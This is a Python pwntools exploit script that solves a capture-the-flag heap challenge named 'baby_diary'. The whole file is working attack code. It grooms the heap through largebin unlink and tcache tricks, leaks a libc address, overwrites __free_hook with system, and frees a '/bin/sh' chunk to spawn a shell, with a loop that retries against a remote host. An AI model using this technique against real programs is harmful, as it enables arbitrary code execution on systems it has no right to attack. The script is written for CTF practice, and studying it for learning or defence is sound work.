# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = 'baby_diary'
elf = ELF('baby_diary')
libc = elf.libc
context.binary = binary
DEBUG = 1
if DEBUG:
  p = process(binary)
  #p = process(['qemu-aarch64','-L','',binary])
  #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
  host = ''
  port = ''
  p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
  gdb.attach(p)
  pause()

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def cmd(num):
    sla(">> ",num)

def add(size,text = ""):
    cmd(1)
    sla("size: ",size - 1)
    sla("content: ",text)

def show(id):
    cmd(2)
    sla("index: ",id)

def delete(id):
    cmd(3)
    sla("index: ",id)


def pwn():
# ----------------
  add(0xd60) #0
  add(0x88)

  add(0x418)
  add(0x18)
  add(0x428)
  add(0x4f8)
  add(0x108)
  add(0x428)
  add(0x38) #8


  delete(2)
  delete(5)
  delete(7)
  delete(4)

  add(0x418 , p64(0x9) )  #2

  add(0x428) #4
  add(0x508) #5
  add(0x418) #7


  # delete(2)
  delete(7) 
  delete(4)

  add(0x508) #4
  add(0x428) #7

  # dbg()
  # ----------------
  # 只用 largebin 构造 unlink 指针部分，建议反复复习 

  add(0x3f8 , '\x03'*9 ) #9
  add(0x18 , '\x00'*0x17)

  delete(10)

  add(0x18 , flat( 0 ,5))

  for i in range(7):
    add(0x108)
  add(0xd0)
  for i in range(10 , 10+8):
    delete(i)

  for i in range(7):
    add(0xd0)
  # delete(3)
  delete(6)
  # dbg()

  add(0xd0) #6
  # add(0x100)
  show(9)

  __malloc_hook = l64() - 0x70
  lg('__malloc_hook',__malloc_hook)
  libc.address = __malloc_hook - libc.sym['__malloc_hook']
  system_addr = libc.sym['system']
  __free_hook = libc.sym['__free_hook']
  binsh_addr = libc.search('/bin/sh').next()

  for i in range(10 , 10+6):
    delete(i)
  delete(18)
  delete(6)
  add(0x450 , flat('\x00'*0xd0 , 0 , 0x21 ,0,0 )) #6
  delete(9)

  delete(6)
  add(0x450 , flat('\x00'*0xd0 , 0 , 0x21 ,__free_hook - 8 ,0 ))
  add(0x1b0 - 0x10)
  add(0x18)

  add(0x18 , flat( '/bin/sh\x00' , system_addr ))

  delete(11)
  # dbg()


  p.interactive()

exhaust(pwn)
# pwn()

'''
@File    :   baby_diary.py
@Time    :   2021/06/12 12:03:05
@Author  :   Niyah 
'''